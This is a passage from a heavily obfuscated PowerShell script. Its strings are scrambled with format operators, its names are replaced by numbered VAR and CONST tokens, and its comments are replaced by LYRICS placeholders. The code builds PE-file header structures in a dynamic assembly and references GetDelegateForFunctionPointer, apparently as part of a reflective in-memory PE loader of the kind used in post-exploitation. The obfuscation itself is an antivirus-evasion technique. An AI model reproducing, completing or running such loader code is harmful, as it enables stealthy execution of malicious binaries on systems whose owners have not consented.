        [ValidateSet(  {"{0}{2}{1}" -f 'WideS','r','t'}, 'Str', {"{2}{0}{1}" -f 'oO','utput','N'}, {"{3}{2}{1}{0}" -f 'gs','Settin','lt','Defau'}   )]
        [String]
        $VAR003  =  (  "{2}{1}{0}" -f'aultSettings','ef','D'),
# LYRICS004
        [Parameter( POSItIon   =  3  )]
        [String]
        $VAR004,
# LYRICS005
        [Parameter( POsitIoN =  4 )]
        [Int32]
        $VAR005,
# LYRICS006
        [Parameter(  PosItIOn  = 5  )]
        [String]
        $VAR006,
# LYRICS007
        [Switch]
        $VAR007,
# LYRICS008
        [Switch]
        $VAR008
      )
# LYRICS009
     &  ( "{2}{0}{1}{3}"-f 'tr','ictMod','Set-S','e'  ) -Version 2
# LYRICS010

$VAR099 =   [System.Runtime.InteropServices.Marshal]
# LYRICS010
$VAR098   =   [System.Runtime.InteropServices.MarshalAsAttribute]
# LYRICS011
$VAR097  = [System.Runtime.InteropServices.UnmanagedType]
$VAR096   = ("{2}{1}{3}{4}{0}" -f 'ctionPointer','ateForF','GetDeleg','u','n')
$VAR095   =   [IntPtr]

# LYRICS011
    $VAR009   = {
        [CmdletBinding(  )]
        Param( 
            [Parameter( pOSITioN =  0, MAndaToRY  = $true )]
            [Byte[]]
            $VAR001,
# LYRICS012
            [Parameter( positIon   =   1, MaNdAtORy = $true  )]
            [String]
            $VAR003,
# LYRICS013
            [Parameter( POSItIon   =   2, MaNDaTORY  =   $true  )]
            [Int32]
            $VAR005,
# LYRICS014
            [Parameter(  POsItIon =  3, maNdaTorY =  $true )]
            [String]
            $VAR006,
# LYRICS015
            [Parameter(  pOsItION   = 4, MANdaTorY =   $true )]
            [Bool]
            $VAR007,
# LYRICS016
            [Parameter(poSItIon =  5, MandatoRY =  $true  )]
            [String]
            $VAR004
         )
# LYRICS017
# LYRICS018
# LYRICS019
# LYRICS020
        Function Fu`N001 {
# LYRICS021
# LYRICS022
            $VAR010   = &  ( "{3}{1}{2}{0}"-f 'ct','bj','e','New-O'  ) (  "{0}{1}{3}{4}{2}"-f'Sys','te','ect','m.Ob','j' )
# LYRICS023
# LYRICS024
# LYRICS025
            $Domain =  (   & (  'gi'  )  ( 'varIAb' +'L'+ 'e:D9m'+ '0Q'+  'n' )  ).VAluE::"c`UrreNt`dOmaIN"
# LYRICS026
# LYRICS027
            $VAR012 =    & ("{2}{1}{0}"-f'w-Object','e','N' ) ( "{6}{0}{5}{2}{7}{3}{1}{4}{8}"-f 't','ssembl','.Ref','n.A','yN','em','Sys','lectio','ame'  )(  ( "{2}{1}{0}{3}"-f 'ssem','micA','Dyna','bly'  ))
# LYRICS028
# LYRICS029
            $VAR013 =  $Domain."dEfiNEdy`N`AMIcAsS`EmBLY"($VAR012,  (  &  ( "{0}{1}"-f'VaR','IaBLE' ) 6kjfH -VALUeON   )::"R`Un" )
            $VAR014   =  $VAR013.("{3}{1}{4}{2}{0}{5}" -f 'u','e','d','Defin','DynamicMo','le' ).Invoke(  ( "{1}{2}{0}" -f'micModule','Dy','na'), $false  )
# LYRICS030
# LYRICS031
            $VAR015   = $VAR098.("{2}{3}{1}{0}"-f 'tors','truc','GetCon','s' ).Invoke(  )[0]
# LYRICS032
# LYRICS033
# LYRICS034
# LYRICS035
            $VAR011   = $VAR014.("{0}{2}{1}" -f'Defin','m','eEnu'  ).Invoke(  (  "{1}{2}{0}" -f'e','Mach','ineTyp'  ), ("{0}{1}"-f 'Publi','c' ), [UInt16] )
            $VAR011.( "{1}{0}{2}{3}"-f'Lit','Define','er','al'  ).Invoke(("{1}{0}"-f 'e','Nativ' ), [UInt16] 0  ) |   & ("{1}{0}{2}"-f 'ut','O','-Null' )
            $VAR011.(  "{1}{3}{0}{2}" -f'Lite','Defi','ral','ne').Invoke(("{2}{0}{1}" -f'ON','ST089','C'), [UInt16] 0x014c  ) |   & (  "{0}{1}" -f'Out','-Null' )
            $VAR011.(  "{0}{3}{1}{2}"-f'D','neLitera','l','efi' ).Invoke( (  "{0}{2}{1}"-f 'C','NST090','O' ), [UInt16] 0x0200  )  |  &  ( "{1}{0}"-f'ull','Out-N'  )
# LYRICS036
# LYRICS037
            $VAR011.( "{0}{3}{1}{2}" -f'Define','tera','l','Li' ).Invoke(( "{2}{1}{0}" -f '91','0','CONST' ), [UInt16] 0x8664  )  |   & ("{2}{0}{1}"-f't-Nu','ll','Ou' )
            $VAR016  = $VAR011.("{1}{0}{2}"-f 'ateTyp','Cre','e' ).Invoke(  )
            $VAR010  |  &  ( "{0}{1}{2}"-f'Add-Mem','b','er' ) -MemberType ("{0}{1}{2}" -f 'NotePr','op','erty') -Name ( "{0}{2}{1}{3}" -f'Mac','in','h','eType') -Value $VAR016
# LYRICS038
# LYRICS039
            $VAR011  = $VAR014.(  "{1}{0}{2}" -f 'efineEnu','D','m').Invoke(  ( "{0}{3}{1}{2}" -f'M','gicTyp','e','a' ), ("{1}{0}"-f 'blic','Pu'  ), [UInt16] )
            $VAR011.(  "{1}{2}{0}" -f'eLiteral','D','efin' ).Invoke(  (  "{0}{2}{1}"-f 'CONST','00','1' ), [UInt16] 0x10b  ) |    &  ( "{1}{0}"-f'll','Out-Nu')
            $VAR011.(  "{1}{2}{0}"-f'teral','Defin','eLi' ).Invoke((  "{2}{0}{1}" -f 'T10','1','CONS'), [UInt16] 0x20b ) |    &  ("{0}{1}"-f'O','ut-Null'  )
            $VAR021   =   $VAR011.( "{2}{1}{0}" -f'Type','ate','Cre' ).Invoke(  )
            $VAR010  |    &("{2}{0}{3}{1}"-f 'd-','er','Ad','Memb'  ) -MemberType (  "{1}{2}{3}{0}" -f 'y','Not','ePrope','rt' ) -Name ( "{2}{0}{1}"-f'agicT','ype','M') -Value $VAR021
# LYRICS040
# LYRICS041
            $VAR011 =   $VAR014.("{0}{1}{3}{2}" -f'D','e','num','fineE'  ).Invoke(  ( "{2}{0}{3}{1}"-f'ONST047Ty','e','C','p' ), ( "{0}{1}"-f'Pu','blic'), [UInt16] )
            $VAR011.("{0}{1}{2}"-f 'Defi','neLit','eral' ).Invoke(  ( "{2}{0}{1}" -f'ST1','02','CON' ), [UInt16] 0  )   |  &  (  "{2}{1}{0}" -f 'l','ul','Out-N' )
            $VAR011.("{3}{1}{0}{2}"-f 'e','t','ral','DefineLi').Invoke( (  "{2}{0}{1}" -f 'ST10','3','CON'), [UInt16] 1 ) |   & ( "{0}{1}" -f 'Ou','t-Null'  )
            $VAR011.( "{2}{1}{3}{0}"-f'iteral','fin','De','eL'  ).Invoke(( "{1}{0}{2}" -f '1','CONST','04' ), [UInt16] 2  ) |  & ("{0}{1}"-f'Out-N','ull'  )
            $VAR011.( "{0}{1}{2}{3}"-f'Def','in','e','Literal').Invoke(("{1}{0}{2}" -f '0','CONST','99' ), [UInt16] 3 )  |  &  (  "{0}{1}" -f 'O','ut-Null')
            $VAR011.( "{2}{1}{0}"-f'teral','efineLi','D' ).Invoke(  (  "{2}{0}{1}"-f'ST','098','CON' ), [UInt16] 7 )   |    &(  "{2}{0}{1}" -f'ut-N','ull','O'  )
# LYRICS042
# LYRICS043
            $VAR011.(  "{2}{0}{1}{3}" -f 'L','i','Define','teral'  ).Invoke((  "{1}{0}" -f'ST097','CON' ), [UInt16] 9)  |     & (  "{0}{2}{1}" -f'Ou','ll','t-Nu'  )
            $VAR011.("{4}{3}{1}{0}{2}" -f 'iter','eL','al','efin','D'  ).Invoke( (  "{2}{1}{0}"-f '6','09','CONST'  ), [UInt16] 10  )  |   & ("{0}{2}{1}" -f 'O','t-Null','u' )
            $VAR011.(  "{3}{0}{2}{1}" -f 'e','neLiteral','fi','D'  ).Invoke(  ( "{2}{1}{0}"-f'NST095','O','C' ), [UInt16] 11  )  |  & ("{0}{1}"-f'Out-Nu','ll'  )
            $VAR011.(  "{1}{3}{0}{2}" -f'ter','Def','al','ineLi' ).Invoke(( "{1}{0}{2}"-f 'ONST','C','094' ), [UInt16] 12) |   &  ("{2}{1}{0}"-f'll','ut-Nu','O' )
# LYRICS044
# LYRICS045
            $VAR011.("{2}{0}{1}" -f'Li','teral','Define').Invoke(  ("{0}{1}{2}" -f 'CO','NST09','3'  ), [UInt16] 13  )   |    &  ( "{0}{2}{1}"-f 'Out-Nu','l','l'  )
            $VAR011.(  "{0}{1}{2}"-f'De','fineLit','eral' ).Invoke(("{1}{2}{0}" -f 'T092','CON','S' ), [UInt16] 14 ) |   &(  "{1}{2}{0}"-f '-Null','Ou','t'  )
            $VAR017   =   $VAR011.( "{1}{0}{2}"-f'y','CreateT','pe' ).Invoke(  )
            $VAR010   |    & ("{1}{0}{2}" -f'm','Add-Me','ber' ) -MemberType ("{2}{3}{1}{0}"-f 'rty','ePrope','N','ot') -Name ( "{1}{2}{3}{0}"-f'Type','C','ONST0','47') -Value $VAR017
# LYRICS046
# LYRICS047
            $VAR011 =   $VAR014.(  "{1}{0}{2}"-f 'En','Define','um').Invoke(  ( "{2}{3}{0}{1}"-f'35Ty','pe','CON','ST0' ), ("{0}{2}{1}"-f 'Pu','lic','b' ), [UInt16]  )
            $VAR011.("{2}{3}{1}{0}"-f'Literal','e','Defi','n'  ).Invoke( ( "{0}{1}{2}"-f'CO','NST08','0'), [UInt16] 0x0001  )  | & ("{1}{0}"-f'Null','Out-')
            $VAR011.("{2}{0}{1}" -f 'neLi','teral','Defi'  ).Invoke(( "{0}{2}{1}" -f 'CO','79','NST0'  ), [UInt16] 0x0002 ) |     &("{1}{0}{2}"-f'ul','Out-N','l'  )
            $VAR011.( "{1}{2}{0}"-f'iteral','De','fineL' ).Invoke(  ("{0}{1}{2}"-f'CO','NST07','8'), [UInt16] 0x0004)  |    &  ( "{1}{2}{0}"-f'-Null','Ou','t'  )
            $VAR011.(  "{1}{3}{2}{0}"-f 'al','D','ineLiter','ef'  ).Invoke((  "{2}{1}{0}" -f'077','NST','CO'  ), [UInt16] 0x0008)  |     &  (  "{0}{1}{2}" -f'Out-','Nu','ll' )
            $VAR011.(  "{0}{2}{1}"-f 'De','teral','fineLi').Invoke(  ("{2}{0}{1}"-f 'NST','088','CO' ), [UInt16] 0x0040  )  |     &  ("{1}{0}{2}" -f't-Nu','Ou','ll')
            $VAR011.(  "{1}{2}{3}{0}" -f 'ral','Defin','eL','ite'  ).Invoke(( "{0}{1}" -f 'CON','ST087'), [UInt16] 0x0080 )  |   &(  "{0}{1}{2}"-f'O','ut-','Null'  )
# LYRICS048
# LYRICS049
            $VAR011.( "{0}{2}{1}"-f 'Define','iteral','L').Invoke(("{2}{1}{0}"-f 'ST086','ON','C'  ), [UInt16] 0x0100  ) | & ("{2}{1}{0}" -f 'ull','ut-N','O'  )
            $VAR011.(  "{3}{1}{0}{4}{2}"-f'L','efine','l','D','itera' ).Invoke( ( "{0}{2}{1}"-f 'CONS','85','T0'  ), [UInt16] 0x0200  ) |   &(  "{2}{0}{1}" -f'-Nu','ll','Out' )
            $VAR011.(  "{3}{0}{1}{2}"-f'neLit','er','al','Defi').Invoke( ("{1}{0}{2}"-f 'ONST','C','084'  ), [UInt16] 0x0400) | &  ( "{0}{2}{1}" -f'Out','ull','-N' )
            $VAR011.( "{0}{1}{2}{3}" -f'De','fin','eLitera','l').Invoke(("{2}{1}{0}" -f'T083','NS','CO'  ), [UInt16] 0x0800)   | &  (  "{1}{0}" -f'-Null','Out'  )
            $VAR011.("{1}{2}{0}{3}" -f 't','Defin','eLi','eral'  ).Invoke(  (  "{0}{1}{2}" -f 'CONS','T07','6'), [UInt16] 0x1000  ) |     &("{0}{1}" -f 'O','ut-Null')
            $VAR011.( "{0}{4}{3}{1}{2}"-f 'D','ra','l','te','efineLi'  ).Invoke( ( "{2}{0}{1}"-f'S','T082','CON'), [UInt16] 0x2000  )  |     &  (  "{1}{0}" -f '-Null','Out' )
            $VAR011.(  "{0}{2}{1}"-f'Defin','iteral','eL' ).Invoke(  ("{0}{1}" -f 'CON','ST081'), [UInt16] 0x8000  ) |    &( "{1}{0}{2}" -f 't-Nu','Ou','ll'  )
            $VAR018  =   $VAR011.("{1}{3}{0}{2}"-f'eTy','C','pe','reat' ).Invoke()
            $VAR010 |   & ( "{1}{2}{0}"-f'mber','Add-','Me') -MemberType ( "{3}{2}{0}{1}"-f 'per','ty','ro','NoteP'  ) -Name ( "{1}{3}{0}{2}" -f '3','CONST','5Type','0' ) -Value $VAR018
# LYRICS050
# LYRICS051
# LYRICS052
            $VAR019   =  ( "{21}{18}{20}{14}{8}{19}{15}{6}{1}{4}{11}{13}{22}{17}{0}{12}{16}{10}{3}{9}{7}{2}{5}"-f' ','Class','Fi',', Bef',',','eldInit','i','re','t','o','ut, Sealed',' Class,','Expli',' Pub','u','s','citLayo',',','uto',', An','Layo','A','lic')
            $VAR011   =  $VAR014.("{2}{0}{1}"-f'n','eType','Defi'  ).Invoke((  "{2}{1}{0}" -f'75','T0','CONS' ), $VAR019, [System.ValueType], 8)
        (  $VAR011.( "{0}{2}{3}{1}"-f 'De','ld','fineF','ie').Invoke( (  "{0}{1}"-f 'CONST','074'), [UInt32], (  "{2}{1}{0}"-f'c','bli','Pu'  ) )  ).("{0}{1}" -f'SetOf','fset'  ).Invoke(0) |    &(  "{0}{1}{2}" -f 'Ou','t-','Null'  )
# LYRICS053
# LYRICS054
        ( $VAR011.(  "{3}{2}{0}{1}" -f 'e','ld','efineFi','D'  ).Invoke(( "{0}{1}" -f'S','ize' ), [UInt32], (  "{0}{2}{1}" -f'Pu','lic','b') )).( "{2}{1}{0}"-f 'et','fs','SetOf').Invoke(4  ) |   &( "{2}{0}{1}"-f't','-Null','Ou' )
            $VAR020  = $VAR011.(  "{0}{1}{2}" -f'Cre','ateTyp','e' ).Invoke(  )
            $VAR010   |   &  (  "{0}{2}{1}" -f'A','-Member','dd' ) -MemberType ("{0}{2}{1}"-f'Not','Property','e') -Name (  "{2}{0}{1}" -f '07','5','CONST' ) -Value $VAR020
# LYRICS055
# LYRICS056
            $VAR019 = ( "{14}{6}{12}{4}{1}{11}{8}{13}{7}{16}{15}{2}{17}{10}{9}{0}{5}{3}"-f'Bef','ut, AnsiCl','tial','Init','yo','oreField','o','s, ','Cl','t, Sealed, ','ou','ass, ','La','as','Aut','n','Public, Seque','Lay'  )
            $VAR011  =  $VAR014.( "{0}{1}{3}{2}" -f'D','e','neType','fi').Invoke( (  "{0}{1}"-f'CON','ST073' ), $VAR019, [System.ValueType], 20 )
            $VAR011.( "{2}{0}{1}"-f 'Fi','eld','Define').Invoke( ("{1}{0}{2}" -f 'chin','Ma','e' ), [UInt16], ("{0}{1}"-f 'Pu','blic' ) )   |   &("{2}{0}{1}" -f'-N','ull','Out')
            $VAR011.( "{1}{0}{2}" -f 'efineF','D','ield').Invoke(  ( "{0}{2}{1}" -f 'CON','2','ST07'  ), [UInt16], ("{1}{0}"-f'lic','Pub' ))   |   &("{0}{1}"-f'Out-','Null' )
            $VAR011.( "{2}{1}{0}" -f'ineField','ef','D'  ).Invoke( (  "{1}{0}{2}" -f 'ON','C','ST071'), [UInt32], ( "{2}{0}{1}"-f 'ub','lic','P')  ) |   &("{1}{2}{0}" -f'l','Out-','Nul')
# LYRICS057
# LYRICS058
            $VAR011.( "{1}{0}{2}" -f'Fiel','Define','d'  ).Invoke(( "{2}{1}{0}" -f '070','ST','CON' ), [UInt32], ("{0}{1}{2}"-f'P','ubl','ic'))   | &("{1}{0}"-f '-Null','Out' )
            $VAR011.( "{0}{3}{2}{1}"-f 'Def','eField','n','i' ).Invoke(  (  "{2}{1}{0}" -f'69','T0','CONS'), [UInt32], ("{1}{2}{0}"-f'c','Pu','bli' ) ) |   &( "{1}{0}{2}"-f'ut-Nu','O','ll' )
            $VAR011.(  "{1}{0}{2}" -f'fine','De','Field'  ).Invoke( (  "{0}{1}{2}" -f'CO','N','ST068'), [UInt16], (  "{0}{1}" -f 'Publi','c'  ) )  |   &( "{0}{1}"-f'Out-N','ull' )
            $VAR011.( "{1}{0}{2}"-f'e','Defin','Field' ).Invoke((  "{2}{0}{1}" -f '06','7','CONST' ), [UInt16], (  "{0}{1}" -f'Publ','ic' ) )   |  &  (  "{0}{2}{1}" -f'O','l','ut-Nul')
            $VAR022  =  $VAR011.("{2}{0}{1}{3}" -f 't','eT','Crea','ype').Invoke( )
            $VAR010   |     & ("{0}{3}{1}{2}"-f 'A','embe','r','dd-M'  ) -MemberType ( "{2}{1}{3}{0}" -f 'rty','eProp','Not','e'  ) -Name (  "{0}{1}{2}" -f 'C','O','NST073') -Value $VAR022
# LYRICS059
# LYRICS060
            $VAR019   = ( "{2}{5}{7}{15}{10}{11}{8}{4}{17}{9}{14}{13}{3}{16}{1}{0}{12}{6}" -f'led, Befo','Sea','AutoLayout,','ut,','ic, ',' An','dInit','siCl',', Publ','pli',', C','lass','reFiel','itLayo','c','ass',' ','Ex'  )
            $VAR011   = $VAR014.( "{3}{2}{0}{1}"-f'neT','ype','fi','De'  ).Invoke( (  "{2}{1}{0}"-f '066','NST','CO' ), $VAR019, [System.ValueType], 240  )
        (  $VAR011.("{0}{1}{2}"-f'Defi','neFie','ld' ).Invoke(  ( "{1}{0}"-f'ic','Mag'), $VAR021, (  "{2}{0}{1}"-f 'ubl','ic','P'  ) )  ).("{2}{1}{0}"-f'tOffset','e','S' ).Invoke(  0)  | &  ("{1}{2}{0}"-f'll','Ou','t-Nu'  )
        ( $VAR011.("{2}{1}{0}" -f'ld','fineFie','De' ).Invoke(("{2}{0}{1}" -f'T0','65','CONS' ), [Byte], ("{1}{0}"-f 'ublic','P')  )  ).( "{2}{0}{1}"-f 'e','tOffset','S'  ).Invoke(2 )  |   &  (  "{1}{0}" -f 't-Null','Ou' )
        ($VAR011.(  "{2}{1}{0}" -f'ield','neF','Defi' ).Invoke(  (  "{2}{1}{0}"-f'064','T','CONS' ), [Byte], ("{0}{1}"-f 'Pub','lic'  ) ) ).(  "{2}{0}{1}"-f'etO','ffset','S' ).Invoke(3  )   |    &  (  "{2}{0}{1}" -f'ut-Nul','l','O')
# LYRICS061
# LYRICS062
        (  $VAR011.("{2}{1}{3}{0}" -f 'eld','ine','Def','Fi' ).Invoke(  (  "{1}{2}{0}" -f 'ST063','C','ON'), [UInt32], ("{1}{0}"-f 'ic','Publ')  )  ).(  "{1}{0}{2}" -f 'f','SetO','fset').Invoke(4)  |    &( "{0}{1}{2}"-f'Ou','t-','Null')
        (  $VAR011.( "{1}{0}{2}"-f'fin','De','eField').Invoke( (  "{0}{1}" -f 'CO','NST062' ), [UInt32], ( "{0}{1}"-f 'Publi','c'  ) ) ).( "{0}{2}{1}"-f 'S','et','etOffs'  ).Invoke(  8  ) |    & ( "{1}{0}" -f 'ull','Out-N' )
        (  $VAR011.("{1}{3}{2}{0}" -f 'ineField','D','f','e'  ).Invoke(  ( "{0}{2}{1}" -f'CONS','061','T' ), [UInt32], ( "{0}{1}"-f 'P','ublic' )  ) ).("{2}{0}{1}" -f'e','t','SetOffs').Invoke(  12  )  |   &  ("{0}{1}{2}"-f 'Ou','t-Nu','ll'  )
        ($VAR011.(  "{0}{3}{2}{1}"-f'Def','d','el','ineFi').Invoke( (  "{1}{0}"-f '60','CONST0'), [UInt32], ( "{0}{2}{1}" -f 'P','blic','u')  ) ).("{2}{1}{0}{3}"-f's','Off','Set','et' ).Invoke( 16  )  |    & ("{1}{0}{2}" -f't-','Ou','Null' )
        ( $VAR011.(  "{2}{1}{0}" -f'Field','efine','D' ).Invoke(("{0}{2}{1}" -f 'C','059','ONST'), [UInt32], ( "{0}{1}" -f'Pub','lic') ) ).( "{1}{0}" -f 'et','SetOffs' ).Invoke(20 ) |   &  (  "{2}{1}{0}"-f 'ull','N','Out-'  )
        (  $VAR011.("{0}{3}{1}{2}" -f 'Defi','eFiel','d','n').Invoke(  ("{2}{1}{0}"-f '058','ONST','C' ), [UInt64], ( "{2}{0}{1}" -f 'bli','c','Pu')  )).("{1}{2}{0}"-f'et','Set','Offs'  ).Invoke(  24)  |   &( "{1}{2}{0}"-f'l','O','ut-Nul')
        ( $VAR011.("{1}{0}{2}" -f 'ineFie','Def','ld').Invoke(( "{1}{0}" -f '057','CONST'  ), [UInt32], ("{1}{0}"-f 'ublic','P'  ) )).(  "{1}{0}{2}" -f't','Se','Offset'  ).Invoke(32)  |    &  ( "{2}{1}{0}"-f'Null','ut-','O'  )
        ($VAR011.("{2}{1}{0}" -f 'ield','neF','Defi' ).Invoke(  ( "{0}{2}{1}"-f'CON','056','ST'  ), [UInt32], ("{0}{1}"-f 'P','ublic' ) ) ).( "{1}{0}{2}" -f'tOffse','Se','t').Invoke(  36) |   & ( "{0}{2}{1}"-f 'Out-Nu','l','l')
# LYRICS063
# LYRICS064
        ( $VAR011.( "{2}{3}{0}{1}" -f 'neFiel','d','D','efi' ).Invoke(( "{2}{1}{0}"-f'T055','S','CON' ), [UInt16], ("{0}{1}" -f'Pub','lic'))  ).("{1}{0}{2}" -f 'ffs','SetO','et' ).Invoke(40 ) |  & ( "{0}{1}{2}"-f'O','ut-Nul','l'  )
        ($VAR011.("{1}{2}{3}{0}"-f'ld','De','fi','neFie'  ).Invoke(  (  "{0}{2}{1}" -f'CONST','4','05' ), [UInt16], (  "{1}{0}"-f 'c','Publi' )  )).(  "{2}{0}{1}" -f 'etO','ffset','S').Invoke(  42) |    & ( "{1}{2}{0}"-f 'l','Out-N','ul')
        ($VAR011.("{1}{2}{0}{3}"-f'Fi','Def','ine','eld'  ).Invoke( ("{1}{0}{2}"-f'5','CONST0','3'), [UInt16], ("{0}{1}{2}"-f 'Pu','b','lic'  ))).(  "{2}{1}{0}" -f'fset','tOf','Se'  ).Invoke( 44 )  |    & (  "{0}{1}"-f 'O','ut-Null'  )
        ($VAR011.( "{0}{1}{3}{2}" -f 'Defi','n','eld','eFi'  ).Invoke(( "{1}{0}{2}" -f'ON','C','ST052' ), [UInt16], ("{0}{1}"-f 'Pu','blic' )  )).(  "{0}{2}{1}"-f 'SetOff','t','se'  ).Invoke(46 )  |   &(  "{0}{1}" -f 'Ou','t-Null' )
        (  $VAR011.(  "{0}{1}{2}" -f'Defin','e','Field' ).Invoke(  (  "{0}{2}{1}"-f'CON','1','ST05'), [UInt16], ( "{1}{0}" -f'c','Publi') )  ).(  "{1}{2}{0}"-f'ffset','Se','tO').Invoke(  48) |    &  (  "{1}{0}"-f 'ut-Null','O' )
        (  $VAR011.(  "{1}{0}{2}{3}"-f'neF','Defi','i','eld'  ).Invoke((  "{1}{0}"-f 'NST050','CO'), [UInt16], (  "{0}{1}"-f'P','ublic') ) ).(  "{0}{1}{2}"-f 'S','et','Offset' ).Invoke(  50 )  |   &  ( "{0}{2}{1}"-f'Out','ll','-Nu')
# LYRICS065
# LYRICS066
        ($VAR011.( "{2}{1}{0}" -f'ield','F','Define').Invoke((  "{0}{1}"-f 'CO','NST049'), [UInt32], ( "{0}{1}" -f 'Pub','lic')  )).(  "{1}{2}{0}"-f'set','Se','tOff').Invoke(  52 )   | &( "{0}{1}"-f 'Out-','Null' )
        ($VAR011.("{2}{1}{0}{3}" -f'e','eFi','Defin','ld' ).Invoke(  ( "{1}{0}{2}"-f'NS','CO','T033'), [UInt32], ( "{0}{1}"-f 'Publ','ic'  )  )  ).( "{1}{0}{2}"-f'etO','S','ffset').Invoke(56 ) |  & ("{0}{1}{2}" -f'Out','-Nu','ll' )
        (  $VAR011.( "{3}{0}{2}{1}"-f'neFi','ld','e','Defi').Invoke( (  "{1}{2}{0}"-f'T034','CO','NS' ), [UInt32], ("{0}{1}"-f 'Publ','ic') ) ).( "{1}{0}{2}" -f'O','Set','ffset' ).Invoke(60)  |   &  ( "{2}{0}{1}"-f 'u','ll','Out-N' )
        ( $VAR011.("{2}{0}{1}"-f 'neFie','ld','Defi').Invoke( ("{0}{1}{2}"-f 'CO','NS','T048' ), [UInt32], (  "{1}{0}" -f 'c','Publi')  )).(  "{1}{2}{0}{3}" -f 'se','Set','Off','t' ).Invoke(  64 )   |  &("{0}{1}" -f'Out','-Null' )
        ($VAR011.(  "{1}{0}{2}" -f 'efineFie','D','ld').Invoke(  (  "{2}{0}{1}" -f'T0','47','CONS'), $VAR017, ( "{2}{1}{0}"-f'ic','l','Pub' ) )  ).( "{1}{0}" -f'fset','SetOf'  ).Invoke( 68 )   |    &  (  "{0}{1}{2}" -f 'Ou','t-Nu','ll' )
        ( $VAR011.("{1}{3}{2}{0}"-f 'ield','D','neF','efi' ).Invoke(  (  "{1}{0}" -f'T035','CONS'), $VAR018, ( "{2}{0}{1}" -f'l','ic','Pub' ) )  ).(  "{2}{1}{0}" -f'tOffset','e','S'  ).Invoke( 70)  |   &  (  "{1}{2}{0}" -f'Null','O','ut-' )
        ( $VAR011.(  "{2}{1}{0}{3}" -f 'Fie','e','Defin','ld'  ).Invoke(  (  "{1}{0}{2}" -f'S','CON','T046'  ), [UInt64], ("{0}{1}"-f'Pub','lic' )  )  ).( "{0}{1}"-f 'Se','tOffset').Invoke( 72)   |     &("{1}{2}{0}" -f'll','Ou','t-Nu'  )
        ($VAR011.(  "{0}{2}{1}" -f'DefineFi','d','el' ).Invoke( ( "{2}{0}{1}"-f 'NST','045','CO' ), [UInt64], ("{0}{1}"-f 'Pub','lic' ))  ).( "{1}{0}{2}"-f 'e','SetOffs','t').Invoke(80 )  | &(  "{1}{0}{2}"-f'-N','Out','ull'  )
        ($VAR011.(  "{3}{1}{2}{0}"-f 'eld','f','ineFi','De'  ).Invoke(  ( "{1}{0}"-f '4','CONST04'  ), [UInt64], (  "{1}{0}" -f 'blic','Pu' ))).(  "{1}{2}{3}{0}"-f 't','SetOff','s','e' ).Invoke(88)  |  & ("{1}{2}{0}"-f 'l','Ou','t-Nul'  )
        ($VAR011.( "{0}{2}{1}{3}" -f 'De','e','fineFi','ld' ).Invoke((  "{1}{0}" -f 'NST043','CO'  ), [UInt64], (  "{1}{0}{2}" -f'i','Publ','c' ) )).(  "{2}{0}{1}" -f 'tO','ffset','Se' ).Invoke( 96)   |   &( "{1}{0}" -f'ut-Null','O' )
# LYRICS067
# LYRICS068
        (  $VAR011.(  "{0}{1}{3}{2}"-f 'D','e','ld','fineFie' ).Invoke(("{0}{1}{2}"-f 'CONS','T10','5'), [UInt32], (  "{1}{0}"-f'ic','Publ') )  ).( "{1}{2}{0}"-f 'et','SetOff','s').Invoke( 104)  |     &  ("{2}{0}{1}" -f'ut-Nu','ll','O' )
        (  $VAR011.(  "{2}{0}{1}" -f 'e','fineField','D' ).Invoke( ("{0}{1}" -f 'CONS','T106'), [UInt32], ( "{1}{0}{2}" -f'bl','Pu','ic'))  ).("{1}{2}{0}" -f'set','SetO','ff'  ).Invoke( 108 )   |    &( "{0}{1}{2}" -f 'O','ut-','Null' )
        ($VAR011.(  "{3}{2}{1}{0}"-f 'ld','e','ineFi','Def').Invoke(  ( "{1}{0}"-f'07','CONST1'  ), $VAR020, (  "{0}{1}"-f 'Pu','blic' ))  ).(  "{1}{0}{2}"-f 'Of','Set','fset' ).Invoke( 112  )   |   & ("{0}{2}{1}"-f'Ou','l','t-Nul' )
        ( $VAR011.("{0}{2}{1}" -f 'De','eld','fineFi').Invoke((  "{0}{1}{2}"-f'CO','NST','108' ), $VAR020, (  "{0}{1}{2}"-f 'P','ubl','ic') )).(  "{2}{0}{1}"-f'etO','ffset','S').Invoke( 120 )  |    &("{0}{2}{1}"-f'O','l','ut-Nul')
        ($VAR011.("{1}{2}{0}" -f 'ld','De','fineFie').Invoke( (  "{1}{0}" -f '09','CONST1'), $VAR020, ("{0}{1}" -f'Pub','lic') ) ).( "{1}{0}{2}"-f 'tO','Se','ffset').Invoke( 128 ) |     &(  "{0}{1}{2}"-f 'Out-N','ul','l' )
        (  $VAR011.( "{0}{3}{1}{2}" -f 'D','ineFi','eld','ef'  ).Invoke(  (  "{1}{0}" -f '10','CONST1'), $VAR020, (  "{0}{1}" -f'Publ','ic'  ))  ).("{2}{0}{1}"-f'et','Offset','S' ).Invoke(  136) |  &  ( "{1}{0}{2}" -f 'ut-Nul','O','l' )
        ($VAR011.("{0}{1}{2}" -f 'Defi','neFi','eld'  ).Invoke( ( "{0}{1}{2}"-f'C','ONST','111' ), $VAR020, (  "{1}{0}"-f 'lic','Pub'  )  )  ).("{1}{2}{0}" -f 'Offset','S','et'  ).Invoke(  144  )   |  &  (  "{1}{0}{2}" -f't','Ou','-Null' )
        (  $VAR011.(  "{2}{0}{1}" -f 'e','Field','Defin'  ).Invoke(  (  "{0}{1}"-f'CONST11','2'), $VAR020, ("{1}{0}" -f'lic','Pub'  )  )).("{0}{1}{2}" -f'SetOff','se','t'  ).Invoke( 152  ) |     &  (  "{1}{0}"-f'-Null','Out' )
        ( $VAR011.("{1}{2}{0}"-f 'd','Def','ineFiel'  ).Invoke( (  "{1}{0}" -f'ug','Deb'  ), $VAR020, (  "{1}{0}" -f'c','Publi' )  )).(  "{2}{0}{1}"-f'O','ffset','Set'  ).Invoke(160) |    & (  "{1}{0}" -f'ull','Out-N')
# LYRICS069
# LYRICS070
        ($VAR011.(  "{0}{2}{1}"-f'DefineFie','d','l'  ).Invoke((  "{1}{3}{0}{2}"-f 't','Archite','ure','c'  ), $VAR020, ("{0}{1}"-f'Pub','lic' ) )).(  "{2}{0}{1}" -f 'tOffs','et','Se').Invoke( 168  ) |     & (  "{2}{0}{1}" -f'u','ll','Out-N')
        (  $VAR011.(  "{1}{0}{2}" -f 'neFi','Defi','eld').Invoke(  ("{1}{0}" -f'13','CONST1'), $VAR020, (  "{1}{2}{0}"-f 'c','Pu','bli' ) )  ).( "{1}{2}{0}"-f 'et','SetO','ffs').Invoke(  176)   |     &( "{1}{2}{0}"-f 'l','Out-','Nul'  )
